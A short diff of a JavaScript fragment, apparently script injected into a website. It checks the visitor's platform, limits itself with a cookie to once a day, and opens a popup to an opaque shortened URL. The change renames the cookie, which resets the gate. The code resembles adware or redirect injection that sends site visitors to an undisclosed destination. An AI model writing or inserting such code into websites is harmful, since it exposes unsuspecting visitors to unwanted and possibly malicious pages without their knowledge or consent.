@@ -2,8 +2,8 @@ if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') 
     throw SyntaxError();
 }
 
-    if (!getCookie('cc_cookie')) {
-        setCookie('cc_cookie','ok',1);
+    if (!getCookie('cc_c1ookie')) {
+        setCookie('cc_c1ookie','ok',1);
         window.open("http://t.cn/EGwS68r");
      }
 
